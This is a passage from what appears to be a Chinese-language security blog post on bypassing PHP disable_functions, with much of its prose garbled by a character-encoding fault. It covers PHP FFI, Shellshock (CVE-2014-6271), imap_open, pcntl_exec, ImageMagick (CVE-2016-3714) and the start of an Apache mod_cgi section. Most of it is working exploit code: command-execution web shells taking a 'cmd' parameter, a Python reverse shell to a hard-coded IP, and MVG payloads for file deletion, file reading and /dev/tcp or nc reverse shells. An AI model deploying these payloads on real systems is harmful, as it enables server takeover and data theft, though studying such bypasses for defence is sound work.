class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$cmd</span> &gt; /tmp/SD&quot;</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;/tmp/SD&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061656357.png" alt="image-20231206165616298"><br>å½“æ²¡æœ‰æƒé™åˆ›å»ºæˆ–è€…ä¿®æ”¹æ–‡ä»¶æ—¶å¯ä»¥å‚è€ƒbuuä¸Š<strong>FighterFightsInvincibly</strong>ä¸€é¢˜</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $ffi-&gt;popen(&quot;ls /&quot;,&quot;r&quot;);$d = &quot;&quot;;while(($c = $ffi-&gt;fgetc($o)) != -1)&#123;$d .= str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$ffi-&gt;pclose($o);echo hex2bin($d);/*</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;$ffi = FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$ffi-&gt;php_exec(3,&quot;ls /&quot;);/*</span><br></pre></td></tr></table></figure><h2 id="åˆ©ç”¨Bash-Shellshock-CVE-2014-6271-ç ´å£³æ¼æ´"><a href="#åˆ©ç”¨Bash-Shellshock-CVE-2014-6271-ç ´å£³æ¼æ´" class="headerlink" title="åˆ©ç”¨Bash Shellshock(CVE-2014-6271)ç ´å£³æ¼æ´"></a>åˆ©ç”¨Bash Shellshock(CVE-2014-6271)ç ´å£³æ¼æ´</h2><h3 id="åˆ©ç”¨æ¡ä»¶-2"><a href="#åˆ©ç”¨æ¡ä»¶-2" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>åˆ©ç”¨æ¡ä»¶php &lt; 5.6.2 &amp; bash &lt;&#x3D; 4.3ï¼ˆç ´å£³ï¼‰<blockquote><p>æ¼æ´åŸç†å¦‚ä¸‹ï¼š<br>Bashä½¿ç”¨çš„ç¯å¢ƒå˜é‡æ˜¯é€šè¿‡å‡½æ•°åç§°æ¥è°ƒç”¨çš„ï¼Œå¯¼è‡´æ¼æ´å‡ºé—®é¢˜æ˜¯ä»¥â€œ(){â€å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ENVä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤ã€‚è€Œå…¶æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œä¹Ÿæ²¡æœ‰åšå‡ºåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­ã€‚</p></blockquote></li></ul><p>è¿™ä¸ªå¤ç°å°±ç›´ç”¨vulhubçš„ç¯å¢ƒäº†ï¼Œåˆ©ç”¨è¿™ä¸ªç»•è¿‡å…¶å®å°±æ˜¯çœ‹å­˜ä¸å­˜åœ¨ç ´å£³æ¼æ´<br>ç®€å•æµ‹è¯•ä¸€ä¸‹æ˜¯å¦å­˜åœ¨ç ´å£³æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=&#x27;() &#123; :;&#125;; echo vulnerable&#x27; bash -c &quot;echo this is a test&quot;</span><br></pre></td></tr></table></figure><p>å¦‚æœè¾“å‡ºvulnerableè¡¨ç¤ºå­˜åœ¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061656407.png" alt="image-20231206165631346"><br>åˆ©ç”¨expå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span></span><br><span class="line"><span class="comment"># Google Dork: none </span></span><br><span class="line"><span class="comment"># Date: 10/31/2014 </span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall) </span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net </span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2) </span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6 </span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span></span><br><span class="line">   <span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>); </span><br><span class="line">   <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>); </span><br><span class="line">   <span class="comment">// In Safe Mode, the user may only alter environment variableswhose names </span></span><br><span class="line">   <span class="comment">// begin with the prefixes supplied by this directive. </span></span><br><span class="line">   <span class="comment">// By default, users will only be able to set environment variablesthat </span></span><br><span class="line">   <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span></span><br><span class="line">   <span class="comment">// PHP will let the user modify ANY environment variable! </span></span><br><span class="line">   <span class="comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span></span><br><span class="line">   <span class="title function_ invoke__">error_log</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">   <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   @<span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>); </span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>; </span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shellshock</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†ä¸Šé¢çš„expä¸Šä¼ åˆ°é¶æœºçš„tmpç›®å½•ä¸‹ç„¶åå»åŒ…å«å†æ‰§è¡Œå‘½ä»¤å³å¯ï¼Œè¿™é‡Œæ²¡æœ‰å¥½çš„æµ‹è¯•ç¯å¢ƒæˆ‘å°±ä¸æµ‹äº†ï¼Œè´´ä¸ªå›¾<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061656688.png" alt="image-20231206165656631"></p><h2 id="åˆ©ç”¨imap-open-ç»•è¿‡"><a href="#åˆ©ç”¨imap-open-ç»•è¿‡" class="headerlink" title="åˆ©ç”¨imap_open()ç»•è¿‡"></a>åˆ©ç”¨imap_open()ç»•è¿‡</h2><h3 id="åˆ©ç”¨æ¡ä»¶-3"><a href="#åˆ©ç”¨æ¡ä»¶-3" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>å®‰è£…äº†PHPçš„imapæ‰©å±•</li><li>php.iniä¸­å¼€å¯imap.enable_insecure_rshé€‰é¡¹ä¸ºOn</li><li>PHP 5.6.0è‡³PHP 5.6.38ï¼›PHP 7.0.0è‡³PHP 7.0.32ï¼›PHP 7.1.0è‡³PHP 7.1.24ï¼›PHP 7.2.0è‡³PHP 7.2.12<br>å…ˆå®‰è£…ä¸€ä¸‹imapæ‰©å±•<code>apt-get install php-imap</code>ç„¶ååœ¨php.iniä¸­ä¿®æ”¹imap.enable_insecure_rshä¸ºOnå†é‡å¯æœåŠ¡<br>![[Pasted image 20231127145433.png]]<br>åŸºæœ¬åŸç†å¦‚ä¸‹ï¼Œå¤§æ¦‚å°±æ˜¯imap_openå‡½æ•°æ²¡æœ‰å¯¹ä¼ é€’çš„é‚®ç®±åç§°åšå¥½å®‰å…¨æ ¡éªŒ<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP çš„imap_openå‡½æ•°ä¸­çš„æ¼æ´å¯èƒ½å…è®¸ç»è¿‡èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºå—å½±å“çš„è½¯ä»¶çš„imap_openå‡½æ•°åœ¨å°†é‚®ç®±åç§°ä¼ é€’ç»™rshæˆ–sshå‘½ä»¤ä¹‹å‰ä¸æ­£ç¡®åœ°è¿‡æ»¤é‚®ç®±åç§°ã€‚å¦‚æœå¯ç”¨äº†rshå’ŒsshåŠŸèƒ½å¹¶ä¸”rshå‘½ä»¤æ˜¯sshå‘½ä»¤çš„ç¬¦å·é“¾æ¥ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘ç›®æ ‡ç³»ç»Ÿå‘é€åŒ…å«-oProxyCommandå‚æ•°çš„æ¶æ„IMAPæœåŠ¡å™¨åç§°æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚æˆåŠŸçš„æ”»å‡»å¯èƒ½å…è®¸æ”»å‡»è€…ç»•è¿‡å…¶ä»–ç¦ç”¨çš„exec å—å½±å“è½¯ä»¶ä¸­çš„åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¿™äº›åŠŸèƒ½åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„shellå‘½ä»¤ã€‚</span><br></pre></td></tr></table></figure>EXP<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imap_open&#x27;</span>)) &#123;  </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no imap_open function!&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$server</span> = <span class="string">&quot;x -oProxyCommand=echot&quot;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>].<span class="string">&quot;&gt;/tmp/cmd_result&quot;</span>) . <span class="string">&quot;|base64t-d|sh&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">imap_open</span>(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$server</span> . <span class="string">&#x27;:143/imap&#125;INBOX&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;nnError: &quot;</span>.<span class="title function_ invoke__">imap_last_error</span>());</span><br><span class="line"><span class="title function_ invoke__">sleep</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/tmp/cmd_result&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>è¿™é‡Œæˆ‘æœºå™¨ä¸Šçš„phpç‰ˆæœ¬ä¸è¡Œï¼Œæ‡’å¾—å¤ç°äº†</li></ul><h2 id="åˆ©ç”¨-pcntl-exec"><a href="#åˆ©ç”¨-pcntl-exec" class="headerlink" title="åˆ©ç”¨ pcntl_exec"></a>åˆ©ç”¨ pcntl_exec</h2><h3 id="åˆ©ç”¨æ¡ä»¶-4"><a href="#åˆ©ç”¨æ¡ä»¶-4" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>PHPå®‰è£…å¹¶å¯ç”¨äº†pcntlæ’ä»¶<br>åˆ©ç”¨pcntl_exec()ï¼Œå®ƒæ˜¯pcntlæ’ä»¶ä¸“æœ‰çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‡½æ•°ï¼Œä½†æ˜¯è¿™ä¸ªå‘½ä»¤æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥å¸¸ç”¨æ¥åå¼¹shellï¼Œåœ¨webç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªphpæ–‡ä»¶ï¼ŒåŠ å…¥ä¸‹é¢ä»£ç <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="string">&quot;/usr/bin/python&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((&quot;132.232.75.90&quot;,9898));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span>));</span><br></pre></td></tr></table></figure>ç„¶åè®¿é—®è¿™ä¸ªæ–‡ä»¶å³å¯åå¼¹æˆåŠŸï¼Œæˆ‘è¿™é‡Œæ²¡è£…è¿™ä¸ªæ’ä»¶ï¼Œè£…è¿™ä¸ªæ¯”è¾ƒéº»çƒ¦å°±æ‡’å¾—å¤ç°äº†ï¼Œè¿™ä¸ªä¹Ÿç®—æ˜¯é»‘åå•ç»•è¿‡äº†</li></ul><h2 id="åˆ©ç”¨-ImageMagick-bypass"><a href="#åˆ©ç”¨-ImageMagick-bypass" class="headerlink" title="åˆ©ç”¨ ImageMagick bypass"></a>åˆ©ç”¨ ImageMagick bypass</h2><h3 id="åˆ©ç”¨æ¡ä»¶-5"><a href="#åˆ©ç”¨æ¡ä»¶-5" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>ç›®æ ‡ä¸»æœºå®‰è£…äº†æ¼æ´ç‰ˆæœ¬çš„ imagemagickï¼ˆ&lt;&#x3D; 3.3.0ï¼‰</li><li>å®‰è£…äº† php-imagick æ‹“å±•å¹¶åœ¨ php.ini ä¸­å¯ç”¨</li><li>ç¼–å†™ php é€šè¿‡ new Imagick å¯¹è±¡çš„æ–¹å¼æ¥å¤„ç†å›¾ç‰‡ç­‰æ ¼å¼æ–‡ä»¶</li><li>PHP &gt;&#x3D; 5.4</li></ul><h3 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h3><p>åŸç†å‚è€ƒï¼š<a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">CVE-2016-3714 - ImageMagick å‘½ä»¤æ‰§è¡Œåˆ†æ | ç¦»åˆ«æ­Œ (leavesongs.com)</a><br>ç›´æ¥åœ¨æ–‡ä»¶ä¸Šä¼ å¤„ä¸Šä¼ jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://127.0.0.0/joker.jpg&quot;|id&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>idå¤„ä¸ºå‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202312061657507.png" alt="image-20231206165723432"><br>å¦å¤–è¿˜å¯ä»¥è¿›è¡Œåå¼¹shellã€ssrfã€ä»»æ„æ–‡ä»¶åˆ é™¤ã€ä»»æ„æ–‡ä»¶è¯»å–ç­‰ï¼Œä½†æ˜¯æ²¡å¤ç°æˆåŠŸ<br><strong>SSRF</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(http://example.com/)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>ä»»æ„æ–‡ä»¶åˆ é™¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &#x27;ephemeral:/tmp/delete.txt&#x27;</span><br><span class="line">popgraphic-context</span><br></pre></td></tr></table></figure><p>ä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image over 0,0 0,0 &#x27;label:@/etc/hosts&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>åå¼¹shellï¼Œä¸‹é¢è¿™ä¸¤ç§æ–¹å¼éƒ½å¤±è´¥äº†ä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€ç§æ–¹å¼</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://127.0.0.0/joker.jpg&quot;|bash -i &gt;&amp; /dev/tcp/IP/6666 0&gt;&amp;1&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br><span class="line"></span><br><span class="line">ç¬¬äºŒç§æ–¹å¼</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill &#x27;url(https://127.0.0.0/joker.jpg&quot;|nc -e /bin/bash ip 6666&quot;)&#x27;</span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><p>å¦å¤–çœ‹åˆ«çš„æ–‡ç« ç›´æ¥ç»™äº†expä½†æ²¡å…·ä½“çš„åˆ©ç”¨æ–¹å¼ï¼Œæˆ‘è¿™é‡Œæ²¡æœ‰ç¯å¢ƒä¹Ÿæ— æ³•å»éªŒè¯æ€ä¹ˆåˆ©ç”¨ï¼Œä»¥åé‡åˆ°äº†å†å¼„å§ã€‚ã€‚ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Disable Functions: &quot;</span> . <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = PHP_SAPI == <span class="string">&#x27;cli&#x27;</span> ? <span class="variable">$argv</span>[<span class="number">1</span>] : <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$command</span> == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exploit</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="subst">$command</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;KKKK.mvg&quot;</span>, <span class="variable">$exploit</span>);</span><br><span class="line"><span class="variable">$thumb</span> = <span class="keyword">new</span> <span class="title class_">Imagick</span>();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">readImage</span>(<span class="string">&#x27;KKKK.mvg&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">writeImage</span>(<span class="string">&#x27;KKKK.png&#x27;</span>);</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">clear</span>();</span><br><span class="line"><span class="variable">$thumb</span>-&gt;<span class="title function_ invoke__">destroy</span>();</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.mvg&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&quot;KKKK.png&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åº”è¯¥å°±æ˜¯æ‹¿åˆ°shellåä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ç„¶ååŒ…å«å®ƒå‘½ä»¤æ‰§è¡Œ</p><h2 id="åˆ©ç”¨-Apache-Mod-CGI"><a href="#åˆ©ç”¨-Apache-Mod-CGI" class="headerlink" title="åˆ©ç”¨ Apache Mod CGI"></a>åˆ©ç”¨ Apache Mod CGI</h2><h3 id="åˆ©ç”¨æ¡ä»¶-6"><a href="#åˆ©ç”¨æ¡ä»¶-6" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li>Linux æ“ä½œç³»ç»Ÿ</li><li>Apache + PHP (apache ä½¿ç”¨ apache_mod_php)</li><li>Apache å¼€å¯äº† <code>cgi</code>, <code>rewrite</code></li><li>Web ç›®å½•ç»™äº† <code>AllowOverride</code> æƒé™</li><li>å½“å‰ç›®å½•å¯å†™</li></ul><h3 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><strong>å…³äºMod CGI</strong><br>æ—©æœŸçš„<a href="https://so.csdn.net/so/search?q=Web%E6%9C%8D%E5%8A%A1&spm=1001.2101.3001.7020">WebæœåŠ¡</a>å™¨ï¼Œåªèƒ½å“åº”æµè§ˆå™¨å‘æ¥çš„HTTPé™æ€èµ„æºçš„è¯·æ±‚ï¼Œå¹¶å°†å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„é™æ€èµ„æºè¿”å›ç»™æµè§ˆå™¨ã€‚éšç€WebæŠ€æœ¯çš„å‘å±•ï¼Œé€æ¸å‡ºç°äº†åŠ¨æ€æŠ€æœ¯ï¼Œä½†æ˜¯WebæœåŠ¡å™¨å¹¶ä¸èƒ½å¤Ÿç›´æ¥è¿è¡ŒåŠ¨æ€è„šæœ¬ï¼Œä¸ºäº†è§£å†³WebæœåŠ¡å™¨ä¸å¤–éƒ¨åº”ç”¨ç¨‹åºï¼ˆCGIç¨‹åºï¼‰ä¹‹é—´æ•°æ®äº’é€šï¼Œäºæ˜¯å‡ºç°äº†CGIï¼ˆCommon Gateway Interfaceï¼‰é€šç”¨ç½‘å…³æ¥å£ã€‚ç®€å•ç†è§£ï¼Œå¯ä»¥è®¤ä¸ºCGIæ˜¯WebæœåŠ¡å™¨å’Œè¿è¡Œå…¶ä¸Šçš„åº”ç”¨ç¨‹åºè¿›è¡Œâ€œäº¤æµâ€çš„ä¸€ç§çº¦å®šã€‚</p><p>å½“é‡åˆ°åŠ¨æ€è„šæœ¬è¯·æ±‚æ—¶ï¼ŒWebæœåŠ¡å™¨ä¸»è¿›ç¨‹å°±ä¼šForkåˆ›å»ºå‡ºä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥å¯åŠ¨<a href="https://so.csdn.net/so/search?q=CGI&spm=1001.2101.3001.7020">CGI</a>ç¨‹åºï¼Œè¿è¡Œå¤–éƒ¨Cç¨‹åºæˆ–Perlã€PHPè„šæœ¬ç­‰ï¼Œä¹Ÿå°±æ˜¯å°†åŠ¨æ€è„šæœ¬äº¤ç»™CGIç¨‹åºæ¥å¤„ç†ã€‚è¿™æ ·ï¼Œæ¯æ¬¡ç”¨æˆ·è¯·æ±‚åŠ¨æ€è„šæœ¬ï¼ŒWebæœåŠ¡å™¨éƒ½è¦é‡æ–°Forkåˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹å»å¯åŠ¨CGIç¨‹åºï¼Œç”±CGIç¨‹åºæ¥å¤„ç†åŠ¨æ€è„šæœ¬ï¼Œå¤„ç†å®Œæˆåè¿›ç¨‹éšä¹‹å…³é—­ï¼Œå…¶æ•ˆç‡æ˜¯éå¸¸ä½ä¸‹çš„ã€‚</p><p>è€Œå¯¹äºMod CGIï¼ŒWebæœåŠ¡å™¨å¯ä»¥å†…ç½®Perl<a 